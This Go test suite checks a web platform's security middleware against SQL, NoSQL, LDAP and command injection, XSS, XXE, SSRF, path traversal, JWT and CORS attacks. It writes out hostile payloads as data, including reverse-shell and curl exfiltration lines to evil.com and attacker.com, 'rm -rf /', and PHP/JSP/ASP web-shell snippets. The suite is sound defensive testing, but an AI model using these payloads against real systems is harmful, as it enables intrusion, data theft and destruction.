package testutils

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/kooshapari/kaskmanager-rd-platform/internal/auth"
	"github.com/kooshapari/kaskmanager-rd-platform/internal/database/models"
	"github.com/kooshapari/kaskmanager-rd-platform/internal/security"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/stretchr/testify/suite"
)

// SecurityTestSuite represents comprehensive security tests
type SecurityTestSuite struct {
	TestSuite
	authService     *auth.Service
	securityService *security.SecurityManager
	fixtures        *TestFixtures
	helpers         *TestHelpers
	router          *gin.Engine
	testUser        *models.User
}

// SetupTest sets up the security test suite
func (s *SecurityTestSuite) SetupTest() {
	s.TestSuite.SetupTest()
	gin.SetMode(gin.TestMode)

	// Create services
	s.authService = auth.NewService(s.DB, "test-jwt-secret")
	s.securityService = security.NewSecurityManager(s.DB, nil, s.logger)

	// Create test helpers
	s.fixtures = NewTestFixtures(s.DB)
	s.helpers = NewTestHelpers(s.T())

	// Create test user
	s.testUser = s.fixtures.CreateUser(map[string]interface{}{
		"username": "securitytest",
		"email":    "security@test.com",
		"role":     "user",
	})

	// Setup router with security middleware
	s.setupSecureRouter()
}

// setupSecureRouter sets up a router with all security middleware
func (s *SecurityTestSuite) setupSecureRouter() {
	s.router = gin.New()

	// Add security middleware
	s.router.Use(security.SecurityHeaders(security.DefaultSecurityHeadersConfig("test")))
	s.router.Use(s.securityService.RateLimiter.Middleware())
	s.router.Use(s.securityService.InputValidator.ValidationMiddleware())
	s.router.Use(gin.Recovery())

	// Test endpoints
	api := s.router.Group("/api/v1")
	{
		api.POST("/auth/login", s.handleLogin)
		api.GET("/users/:id", s.handleGetUser)
		api.POST("/users", s.handleCreateUser)
		api.PUT("/users/:id", s.handleUpdateUser)
		api.DELETE("/users/:id", s.handleDeleteUser)
		api.POST("/search", s.handleSearch)
		api.POST("/data", s.handleDataSubmission)
	}
}

// Mock handlers for testing
func (s *SecurityTestSuite) handleLogin(c *gin.Context) {
	var loginData struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}

	if err := c.ShouldBindJSON(&loginData); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid input"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"token": "test-token", "user": loginData.Username})
}

func (s *SecurityTestSuite) handleGetUser(c *gin.Context) {
	userID := c.Param("id")
	if _, err := uuid.Parse(userID); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid user ID"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"id": userID, "username": "testuser"})
}

func (s *SecurityTestSuite) handleCreateUser(c *gin.Context) {
	var userData map[string]interface{}
	if err := c.ShouldBindJSON(&userData); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid input"})
		return
	}

	c.JSON(http.StatusCreated, gin.H{"id": uuid.New().String(), "created": true})
}

func (s *SecurityTestSuite) handleUpdateUser(c *gin.Context) {
	userID := c.Param("id")
	var userData map[string]interface{}
	if err := c.ShouldBindJSON(&userData); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid input"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"id": userID, "updated": true})
}

func (s *SecurityTestSuite) handleDeleteUser(c *gin.Context) {
	userID := c.Param("id")
	c.JSON(http.StatusOK, gin.H{"id": userID, "deleted": true})
}

func (s *SecurityTestSuite) handleSearch(c *gin.Context) {
	var searchData map[string]interface{}
	if err := c.ShouldBindJSON(&searchData); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid input"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"results": []string{"result1", "result2"}})
}

func (s *SecurityTestSuite) handleDataSubmission(c *gin.Context) {
	var data map[string]interface{}
	if err := c.ShouldBindJSON(&data); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid input"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"received": true, "data": data})
}

// makeSecurityRequest is a helper to make HTTP requests for security testing
func (s *SecurityTestSuite) makeSecurityRequest(method, path string, body interface{}, headers map[string]string) *httptest.ResponseRecorder {
	var bodyReader *bytes.Reader
	if body != nil {
		bodyBytes, _ := json.Marshal(body)
		bodyReader = bytes.NewReader(bodyBytes)
	} else {
		bodyReader = bytes.NewReader([]byte{})
	}

	req := httptest.NewRequest(method, path, bodyReader)
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}

	// Add custom headers
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	recorder := httptest.NewRecorder()
	s.router.ServeHTTP(recorder, req)

	return recorder
}

// Test SQL Injection Protection
func (s *SecurityTestSuite) TestSQLInjectionProtection() {
	sqlInjectionPayloads := []string{
		"'; DROP TABLE users; --",
		"1' OR '1'='1",
		"admin'--",
		"1' UNION SELECT * FROM passwords--",
		"'; INSERT INTO users (username) VALUES ('hacker'); --",
		"1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
		"1' AND 1=CONVERT(int,(SELECT @@version))--",
		"'; EXEC xp_cmdshell('dir'); --",
	}

	for _, payload := range sqlInjectionPayloads {
		s.T().Run(fmt.Sprintf("SQLInjection_%s", payload), func(t *testing.T) {
			// Test in login endpoint
			loginData := map[string]interface{}{
				"username": payload,
				"password": "password",
			}

			recorder := s.makeSecurityRequest("POST", "/api/v1/auth/login", loginData, nil)

			// Should be blocked by input validation
			assert.Equal(t, http.StatusBadRequest, recorder.Code)

			var response map[string]interface{}
			json.Unmarshal(recorder.Body.Bytes(), &response)
			assert.Contains(t, response["error"], "injection")
		})
	}
}

// Test XSS Protection
func (s *SecurityTestSuite) TestXSSProtection() {
	xssPayloads := []string{
		"<script>alert('XSS')</script>",
		"javascript:alert('XSS')",
		"<img src=x onerror=alert('XSS')>",
		"<svg onload=alert('XSS')>",
		"<iframe src=javascript:alert('XSS')></iframe>",
		"<object data=javascript:alert('XSS')>",
		"<embed src=javascript:alert('XSS')>",
		"<input onfocus=alert('XSS') autofocus>",
		"<select onfocus=alert('XSS') autofocus>",
		"<textarea onfocus=alert('XSS') autofocus>",
	}

	for _, payload := range xssPayloads {
		s.T().Run(fmt.Sprintf("XSS_%s", payload), func(t *testing.T) {
			// Test in user creation endpoint
			userData := map[string]interface{}{
				"username":    payload,
				"email":       "test@example.com",
				"description": payload,
			}

			recorder := s.makeSecurityRequest("POST", "/api/v1/users", userData, nil)

			// Should be blocked by input validation
			assert.Equal(t, http.StatusBadRequest, recorder.Code)

			var response map[string]interface{}
			json.Unmarshal(recorder.Body.Bytes(), &response)
			assert.Contains(t, response["error"], "XSS")
		})
	}
}

// Test NoSQL Injection Protection
func (s *SecurityTestSuite) TestNoSQLInjectionProtection() {
	noSQLPayloads := []map[string]interface{}{
		{"$ne": nil},
		{"$gt": ""},
		{"$regex": ".*"},
		{"$where": "function() { return true; }"},
		{"$expr": map[string]interface{}{"$gt": []interface{}{"$field", "value"}}},
		{"username": map[string]interface{}{"$ne": nil}},
		{"password": map[string]interface{}{"$regex": ".*"}},
	}

	for i, payload := range noSQLPayloads {
		s.T().Run(fmt.Sprintf("NoSQLInjection_%d", i), func(t *testing.T) {
			// Test in search endpoint
			searchData := map[string]interface{}{
				"query":   payload,
				"filters": payload,
			}

			recorder := s.makeSecurityRequest("POST", "/api/v1/search", searchData, nil)

			// Should be handled gracefully (either blocked or sanitized)
			assert.True(t, recorder.Code == http.StatusBadRequest || recorder.Code == http.StatusOK)

			if recorder.Code == http.StatusOK {
				// If allowed, verify response doesn't contain injection artifacts
				var response map[string]interface{}
				json.Unmarshal(recorder.Body.Bytes(), &response)
				responseStr := fmt.Sprintf("%v", response)
				assert.NotContains(t, responseStr, "$ne")
				assert.NotContains(t, responseStr, "$gt")
				assert.NotContains(t, responseStr, "$regex")
				assert.NotContains(t, responseStr, "$where")
			}
		})
	}
}

// Test Path Traversal Protection
func (s *SecurityTestSuite) TestPathTraversalProtection() {
	pathTraversalPayloads := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"....//....//....//etc/passwd",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"..%252F..%252F..%252Fetc%252Fpasswd",
		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
		"....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam",
	}

	for _, payload := range pathTraversalPayloads {
		s.T().Run(fmt.Sprintf("PathTraversal_%s", payload), func(t *testing.T) {
			// Test in various endpoints that might handle file paths
			userData := map[string]interface{}{
				"avatar":   payload,
				"document": payload,
				"file":     payload,
			}

			recorder := s.makeSecurityRequest("POST", "/api/v1/users", userData, nil)

			// Should be blocked or sanitized
			if recorder.Code == http.StatusOK {
				var response map[string]interface{}
				json.Unmarshal(recorder.Body.Bytes(), &response)
				responseStr := fmt.Sprintf("%v", response)
				assert.NotContains(t, responseStr, "../")
				assert.NotContains(t, responseStr, "..\\")
				assert.NotContains(t, responseStr, "etc/passwd")
				assert.NotContains(t, responseStr, "system32")
			}
		})
	}
}

// Test Rate Limiting
func (s *SecurityTestSuite) TestRateLimiting() {
	// Make rapid requests to trigger rate limiting
	endpoint := "/api/v1/auth/login"
	loginData := map[string]interface{}{
		"username": "testuser",
		"password": "password",
	}

	successCount := 0
	rateLimitedCount := 0
	totalRequests := 100

	for i := 0; i < totalRequests; i++ {
		recorder := s.makeSecurityRequest("POST", endpoint, loginData, nil)

		if recorder.Code == http.StatusOK {
			successCount++
		} else if recorder.Code == http.StatusTooManyRequests {
			rateLimitedCount++
		}
	}

	// Should have some rate limiting after initial requests
	assert.True(s.T(), rateLimitedCount > 0, "Rate limiting should be triggered with rapid requests")
	assert.True(s.T(), successCount > 0, "Some requests should succeed before rate limiting")

	// Verify rate limit headers
	recorder := s.makeSecurityRequest("POST", endpoint, loginData, nil)
	assert.Contains(s.T(), recorder.Header(), "X-RateLimit-Limit")
	assert.Contains(s.T(), recorder.Header(), "X-RateLimit-Remaining")
}

// Test Security Headers
func (s *SecurityTestSuite) TestSecurityHeaders() {
	recorder := s.makeSecurityRequest("GET", "/api/v1/users/"+uuid.New().String(), nil, nil)

	headers := recorder.Header()

	// Check for essential security headers
	assert.Contains(s.T(), headers, "X-Content-Type-Options")
	assert.Equal(s.T(), "nosniff", headers.Get("X-Content-Type-Options"))

	assert.Contains(s.T(), headers, "X-Frame-Options")
	assert.Equal(s.T(), "DENY", headers.Get("X-Frame-Options"))

	assert.Contains(s.T(), headers, "X-XSS-Protection")
	assert.Equal(s.T(), "1; mode=block", headers.Get("X-XSS-Protection"))

	assert.Contains(s.T(), headers, "Referrer-Policy")
	assert.Equal(s.T(), "strict-origin-when-cross-origin", headers.Get("Referrer-Policy"))

	assert.Contains(s.T(), headers, "Content-Security-Policy")
	csp := headers.Get("Content-Security-Policy")
	assert.Contains(s.T(), csp, "default-src")
	assert.Contains(s.T(), csp, "script-src")
	assert.Contains(s.T(), csp, "style-src")

	// Check for HSTS header (if HTTPS)
	if recorder.Header().Get("X-Forwarded-Proto") == "https" {
		assert.Contains(s.T(), headers, "Strict-Transport-Security")
	}
}

// Test Authentication Bypass Attempts
func (s *SecurityTestSuite) TestAuthenticationBypass() {
	bypassAttempts := []map[string]string{
		{"Authorization": "Bearer null"},
		{"Authorization": "Bearer undefined"},
		{"Authorization": "Bearer "},
		{"Authorization": "Bearer admin"},
		{"Authorization": "Bearer ../../../etc/passwd"},
		{"Authorization": "Basic YWRtaW46YWRtaW4="}, // admin:admin in base64
		{"X-Original-URL": "/admin"},
		{"X-Rewrite-URL": "/admin"},
		{"X-Forwarded-For": "127.0.0.1"},
		{"X-Real-IP": "127.0.0.1"},
		{"X-Originating-IP": "127.0.0.1"},
		{"X-Remote-IP": "127.0.0.1"},
		{"X-Client-IP": "127.0.0.1"},
	}

	for i, headers := range bypassAttempts {
		s.T().Run(fmt.Sprintf("AuthBypass_%d", i), func(t *testing.T) {
			recorder := s.makeSecurityRequest("GET", "/api/v1/users/"+uuid.New().String(), nil, headers)

			// Should not bypass authentication
			assert.True(t, recorder.Code == http.StatusUnauthorized || recorder.Code == http.StatusBadRequest)
		})
	}
}

// Test Parameter Pollution
func (s *SecurityTestSuite) TestParameterPollution() {
	// Test HTTP Parameter Pollution (HPP)
	pollutionData := map[string]interface{}{
		"username": []string{"user1", "admin"},
		"role":     []string{"user", "admin"},
		"id":       []string{"123", "456"},
		"action":   []string{"read", "delete"},
	}

	recorder := s.makeSecurityRequest("POST", "/api/v1/users", pollutionData, nil)

	// Should handle parameter pollution gracefully
	if recorder.Code == http.StatusOK || recorder.Code == http.StatusCreated {
		var response map[string]interface{}
		json.Unmarshal(recorder.Body.Bytes(), &response)

		// Verify that only the first value is used or pollution is rejected
		responseStr := fmt.Sprintf("%v", response)
		assert.NotContains(s.T(), responseStr, "admin")
	}
}

// Test Command Injection Protection
func (s *SecurityTestSuite) TestCommandInjectionProtection() {
	commandInjectionPayloads := []string{
		"; ls -la",
		"| cat /etc/passwd",
		"& whoami",
		"`id`",
		"$(whoami)",
		"; rm -rf /",
		"| nc -e /bin/sh attacker.com 4444",
		"; curl http://evil.com/$(whoami)",
		"& ping -c 5 attacker.com",
		"`curl http://evil.com/$(cat /etc/passwd)`",
	}

	for _, payload := range commandInjectionPayloads {
		s.T().Run(fmt.Sprintf("CommandInjection_%s", payload), func(t *testing.T) {
			userData := map[string]interface{}{
				"command":     payload,
				"filename":    payload,
				"script":      payload,
				"description": payload,
			}

			recorder := s.makeSecurityRequest("POST", "/api/v1/data", userData, nil)

			// Should be blocked or sanitized
			if recorder.Code == http.StatusOK {
				var response map[string]interface{}
				json.Unmarshal(recorder.Body.Bytes(), &response)
				responseStr := fmt.Sprintf("%v", response)
				assert.NotContains(t, responseStr, "passwd")
				assert.NotContains(t, responseStr, "whoami")
				assert.NotContains(t, responseStr, "etc")
			}
		})
	}
}

// Test LDAP Injection Protection
func (s *SecurityTestSuite) TestLDAPInjectionProtection() {
	ldapInjectionPayloads := []string{
		"*)(uid=*",
		"*)(|(uid=*",
		"admin)(&(password=*))",
		"*))%00",
		"*()|&'",
		"*)(objectClass=*",
		"*)(cn=*)",
		"admin)(&(objectClass=user)(password=*))",
	}

	for _, payload := range ldapInjectionPayloads {
		s.T().Run(fmt.Sprintf("LDAPInjection_%s", payload), func(t *testing.T) {
			searchData := map[string]interface{}{
				"filter":   payload,
				"username": payload,
				"query":    payload,
			}

			recorder := s.makeSecurityRequest("POST", "/api/v1/search", searchData, nil)

			// Should be blocked or sanitized
			if recorder.Code == http.StatusOK {
				var response map[string]interface{}
				json.Unmarshal(recorder.Body.Bytes(), &response)
				responseStr := fmt.Sprintf("%v", response)
				assert.NotContains(t, responseStr, "objectClass")
				assert.NotContains(t, responseStr, "uid=*")
			}
		})
	}
}

// Test XML/XXE Protection
func (s *SecurityTestSuite) TestXXEProtection() {
	xxePayloads := []string{
		`<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>`,
		`<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><data>&xxe;</data>`,
		`<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><data>test</data>`,
	}

	for i, payload := range xxePayloads {
		s.T().Run(fmt.Sprintf("XXE_%d", i), func(t *testing.T) {
			req := httptest.NewRequest("POST", "/api/v1/data", strings.NewReader(payload))
			req.Header.Set("Content-Type", "application/xml")

			recorder := httptest.NewRecorder()
			s.router.ServeHTTP(recorder, req)

			// Should be blocked or not processed as XML
			if recorder.Code == http.StatusOK {
				responseBody := recorder.Body.String()
				assert.NotContains(t, responseBody, "root:x:")
				assert.NotContains(t, responseBody, "/etc/passwd")
			}
		})
	}
}

// Test Server-Side Request Forgery (SSRF) Protection
func (s *SecurityTestSuite) TestSSRFProtection() {
	ssrfPayloads := []string{
		"http://127.0.0.1:22",
		"http://localhost:3000",
		"http://169.254.169.254/latest/meta-data/",
		"http://metadata.google.internal/",
		"file:///etc/passwd",
		"gopher://127.0.0.1:11211/_stats",
		"dict://127.0.0.1:11211/info",
		"sftp://evil.com/",
		"tftp://127.0.0.1/",
	}

	for _, payload := range ssrfPayloads {
		s.T().Run(fmt.Sprintf("SSRF_%s", payload), func(t *testing.T) {
			data := map[string]interface{}{
				"url":      payload,
				"callback": payload,
				"webhook":  payload,
				"image":    payload,
			}

			recorder := s.makeSecurityRequest("POST", "/api/v1/data", data, nil)

			// Should be blocked or validated
			if recorder.Code == http.StatusOK {
				var response map[string]interface{}
				json.Unmarshal(recorder.Body.Bytes(), &response)
				responseStr := fmt.Sprintf("%v", response)
				assert.NotContains(t, responseStr, "127.0.0.1")
				assert.NotContains(t, responseStr, "localhost")
				assert.NotContains(t, responseStr, "169.254.169.254")
				assert.NotContains(t, responseStr, "metadata")
			}
		})
	}
}

// Test JWT Security
func (s *SecurityTestSuite) TestJWTSecurity() {
	maliciousJWTs := []string{
		"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.", // No signature
		"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid_signature",
		"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.fake_rsa_signature",
		"not.a.jwt",
		"",
		"bearer token",
	}

	for i, jwt := range maliciousJWTs {
		s.T().Run(fmt.Sprintf("JWT_%d", i), func(t *testing.T) {
			headers := map[string]string{
				"Authorization": "Bearer " + jwt,
			}

			recorder := s.makeSecurityRequest("GET", "/api/v1/users/"+uuid.New().String(), nil, headers)

			// Should reject invalid JWTs
			assert.Equal(t, http.StatusUnauthorized, recorder.Code)
		})
	}
}

// Test Input Size Limits
func (s *SecurityTestSuite) TestInputSizeLimits() {
	// Test with oversized input
	largeString := strings.Repeat("A", 10000)       // 10KB string
	veryLargeString := strings.Repeat("B", 1000000) // 1MB string

	testCases := []struct {
		name string
		data map[string]interface{}
	}{
		{
			name: "LargeUsername",
			data: map[string]interface{}{
				"username": largeString,
				"email":    "test@example.com",
			},
		},
		{
			name: "VeryLargeDescription",
			data: map[string]interface{}{
				"username":    "testuser",
				"description": veryLargeString,
			},
		},
		{
			name: "LargeJSON",
			data: map[string]interface{}{
				"data": map[string]interface{}{
					"field1": largeString,
					"field2": largeString,
					"field3": largeString,
				},
			},
		},
	}

	for _, tc := range testCases {
		s.T().Run(tc.name, func(t *testing.T) {
			recorder := s.makeSecurityRequest("POST", "/api/v1/users", tc.data, nil)

			// Should reject oversized input
			assert.True(t, recorder.Code == http.StatusBadRequest || recorder.Code == http.StatusRequestEntityTooLarge)
		})
	}
}

// Test Password Security
func (s *SecurityTestSuite) TestPasswordSecurity() {
	weakPasswords := []string{
		"123456",
		"password",
		"admin",
		"qwerty",
		"abc123",
		"12345678",
		"password123",
		"",
		"a",
		"aaaaaaaa",
	}

	for _, password := range weakPasswords {
		s.T().Run(fmt.Sprintf("WeakPassword_%s", password), func(t *testing.T) {
			userData := map[string]interface{}{
				"username": "testuser",
				"email":    "test@example.com",
				"password": password,
			}

			recorder := s.makeSecurityRequest("POST", "/api/v1/users", userData, nil)

			// Should reject weak passwords
			if recorder.Code == http.StatusBadRequest {
				var response map[string]interface{}
				json.Unmarshal(recorder.Body.Bytes(), &response)
				assert.Contains(t, fmt.Sprintf("%v", response), "password")
			}
		})
	}

	// Test password hashing
	password := "StrongPassword123!"
	hashedPassword, err := s.authService.HashPassword(password)
	require.NoError(s.T(), err)

	// Verify password is properly hashed
	assert.NotEqual(s.T(), password, hashedPassword)
	assert.True(s.T(), len(hashedPassword) > 50) // bcrypt hashes are typically 60 characters
	assert.True(s.T(), strings.HasPrefix(hashedPassword, "$2a$") || strings.HasPrefix(hashedPassword, "$2b$"))

	// Verify password verification works
	isValid := s.authService.CheckPassword(password, hashedPassword)
	assert.True(s.T(), isValid)

	// Verify wrong password fails
	isValid = s.authService.CheckPassword("WrongPassword", hashedPassword)
	assert.False(s.T(), isValid)
}

// Test Timing Attack Protection
func (s *SecurityTestSuite) TestTimingAttackProtection() {
	// Test login timing with valid vs invalid usernames
	validUsername := s.testUser.Username
	invalidUsername := "nonexistentuser"

	validTimes := make([]time.Duration, 10)
	invalidTimes := make([]time.Duration, 10)

	for i := 0; i < 10; i++ {
		// Time valid username
		start := time.Now()
		s.makeSecurityRequest("POST", "/api/v1/auth/login", map[string]interface{}{
			"username": validUsername,
			"password": "wrongpassword",
		}, nil)
		validTimes[i] = time.Since(start)

		// Time invalid username
		start = time.Now()
		s.makeSecurityRequest("POST", "/api/v1/auth/login", map[string]interface{}{
			"username": invalidUsername,
			"password": "wrongpassword",
		}, nil)
		invalidTimes[i] = time.Since(start)
	}

	// Calculate average times
	var validTotal, invalidTotal time.Duration
	for i := 0; i < 10; i++ {
		validTotal += validTimes[i]
		invalidTotal += invalidTimes[i]
	}

	validAvg := validTotal / 10
	invalidAvg := invalidTotal / 10

	// Times should be similar to prevent timing attacks
	timeDiff := validAvg - invalidAvg
	if timeDiff < 0 {
		timeDiff = -timeDiff
	}

	// Allow for some variance but times should be reasonably close
	maxAllowedDiff := 50 * time.Millisecond
	assert.True(s.T(), timeDiff < maxAllowedDiff,
		"Timing difference too large: valid=%v, invalid=%v, diff=%v",
		validAvg, invalidAvg, timeDiff)
}

// Test Session Security
func (s *SecurityTestSuite) TestSessionSecurity() {
	// Test session fixation protection
	sessionID1 := "initial_session_id"
	headers1 := map[string]string{
		"Cookie": "session_id=" + sessionID1,
	}

	// Login with initial session
	recorder := s.makeSecurityRequest("POST", "/api/v1/auth/login", map[string]interface{}{
		"username": s.testUser.Username,
		"password": "password",
	}, headers1)

	// Session ID should change after login
	cookies := recorder.Header().Get("Set-Cookie")
	if cookies != "" {
		assert.NotContains(s.T(), cookies, sessionID1)
	}

	// Test secure cookie attributes
	if cookies != "" {
		assert.Contains(s.T(), cookies, "HttpOnly")
		assert.Contains(s.T(), cookies, "Secure")
		assert.Contains(s.T(), cookies, "SameSite")
	}
}

// Test File Upload Security
func (s *SecurityTestSuite) TestFileUploadSecurity() {
	maliciousFiles := []struct {
		name     string
		content  string
		mimeType string
	}{
		{"script.php", "<?php system($_GET['cmd']); ?>", "application/x-php"},
		{"script.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "text/plain"},
		{"script.asp", "<% eval request(\"cmd\") %>", "text/plain"},
		{"exploit.exe", "MZ\x90\x00\x03\x00\x00\x00", "application/octet-stream"},
		{"../../../etc/passwd", "root:x:0:0:root:/root:/bin/bash", "text/plain"},
		{"file.pdf.php", "<?php phpinfo(); ?>", "application/pdf"},
	}

	for _, file := range maliciousFiles {
		s.T().Run(fmt.Sprintf("FileUpload_%s", file.name), func(t *testing.T) {
			data := map[string]interface{}{
				"filename": file.name,
				"content":  file.content,
				"mimeType": file.mimeType,
			}

			recorder := s.makeSecurityRequest("POST", "/api/v1/data", data, nil)

			// Should reject or sanitize malicious files
			if recorder.Code == http.StatusOK {
				var response map[string]interface{}
				json.Unmarshal(recorder.Body.Bytes(), &response)
				responseStr := fmt.Sprintf("%v", response)
				assert.NotContains(t, responseStr, "<?php")
				assert.NotContains(t, responseStr, "system(")
				assert.NotContains(t, responseStr, "../")
			}
		})
	}
}

// Test CORS Security
func (s *SecurityTestSuite) TestCORSSecurity() {
	maliciousOrigins := []string{
		"http://evil.com",
		"https://attacker.example.com",
		"null",
		"file://",
		"data:",
		"javascript:",
	}

	for _, origin := range maliciousOrigins {
		s.T().Run(fmt.Sprintf("CORS_%s", origin), func(t *testing.T) {
			headers := map[string]string{
				"Origin": origin,
			}

			recorder := s.makeSecurityRequest("OPTIONS", "/api/v1/users", nil, headers)

			// Should not allow malicious origins
			corsHeader := recorder.Header().Get("Access-Control-Allow-Origin")
			assert.NotEqual(t, origin, corsHeader)
			assert.NotEqual(t, "*", corsHeader) // Should not allow all origins for sensitive endpoints
		})
	}
}

// Run the security test suite
func TestSecurityTestSuite(t *testing.T) {
	suite.Run(t, new(SecurityTestSuite))
}
